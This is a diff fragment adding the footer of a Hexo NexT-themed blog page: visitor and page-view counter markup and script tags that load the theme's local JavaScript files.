+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
